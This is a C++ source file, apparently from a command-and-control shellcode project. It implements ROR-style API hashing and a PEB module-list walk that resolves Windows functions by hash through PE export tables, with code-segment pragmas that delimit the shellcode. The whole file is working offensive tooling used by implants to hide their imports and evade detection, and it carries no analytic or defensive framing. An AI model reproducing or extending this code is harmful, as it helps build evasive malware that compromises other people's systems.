#include "Header.h"

namespace c2shellcode {

#pragma code_seg(push, ".textex$ffff")
	void EndShellcode() {}
#pragma code_seg(pop)

#pragma code_seg(push, ".textex$fffe")
	DWORD rt_hash(const char* str) {
		DWORD h = 0;
		while (*str) {
			h = (h >> ROR_SHIFT) | (h << (sizeof(DWORD) * CHAR_BIT - ROR_SHIFT));
			h += *str >= 'a' ? *str - ('a' - 'A') : *str;
			str++;
		}
		return h;
	}

	LDR_DATA_TABLE_ENTRY* getDataTableEntry(const LIST_ENTRY* ptr) {
		int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		return (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - list_entry_offset);
	}

	PVOID getProcAddrByHash(DWORD hash) {
		PEB* peb = getPEB();
		LIST_ENTRY* first = peb->Ldr->InMemoryOrderModuleList.Flink;
		LIST_ENTRY* ptr = first;
		do {
			LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);
			ptr = ptr->Flink;

			BYTE* baseAddress = (BYTE*)dte->DllBase;
			if (!baseAddress)
				continue;
			IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
			IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
			DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
			if (!iedRVA)
				continue;
			IMAGE_EXPORT_DIRECTORY* ied = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + iedRVA);
			char* moduleName = (char*)(baseAddress + ied->Name);
			DWORD moduleHash = rt_hash(moduleName);
			DWORD* nameRVAs = (DWORD*)(baseAddress + ied->AddressOfNames);
			for (DWORD i = 0; i < ied->NumberOfNames; ++i) {
				char* functionName = (char*)(baseAddress + nameRVAs[i]);
				if (hash == moduleHash + rt_hash(functionName)) {
					WORD ordinal = ((WORD*)(baseAddress + ied->AddressOfNameOrdinals))[i];
					DWORD functionRVA = ((DWORD*)(baseAddress + ied->AddressOfFunctions))[ordinal];
					return baseAddress + functionRVA;
				}
			}
		} while (ptr != first);

		return NULL;
	}
#pragma code_seg(pop)
}
